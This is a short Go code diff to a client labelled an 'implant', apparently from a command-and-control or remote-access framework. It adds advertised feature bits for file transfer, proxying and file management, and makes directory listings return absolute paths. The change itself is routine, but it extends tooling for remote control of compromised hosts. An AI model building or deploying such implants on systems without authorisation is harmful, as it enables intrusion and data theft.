@@ -32,6 +32,11 @@ const (
 	protoVersion = 1
 	writeTimeout = 10 * time.Second
 	pongTimeout  = 60 * time.Second
+
+	// Feature bits advertised in Hello.features.
+	featureFileTransfer = uint32(muxpb.Feature_FEATURE_FILE_TRANSFER)
+	featureProxy        = uint32(muxpb.Feature_FEATURE_PROXY)
+	featureFileManager  = uint32(muxpb.Feature_FEATURE_FILE_MANAGER)
 )
 
 // Config controls how the implant connects and what metadata it reports.
@@ -125,6 +130,7 @@ func (c *Client) run(ctx context.Context) error {
 			Version:  protoVersion,
 			Tags:     c.cfg.tags(),
 			Token:    c.cfg.token(),
+			Features: featureFileTransfer | featureProxy | featureFileManager,
 		}},
 	}); err != nil {
 		return fmt.Errorf("send hello: %w", err)
@@ -282,6 +288,10 @@ func (c *Client) fsList(req *muxpb.FsList) {
 	if err != nil {
 		result.Error = err.Error()
 	} else {
+		absPath, _ := filepath.Abs(req.Path)
+		if absPath != "" {
+			result.AbsolutePath = absPath
+		}
 		for _, e := range entries {
 			info, err := e.Info()
 			entry := &muxpb.FsEntry{Name: e.Name(), IsDir: e.IsDir()}
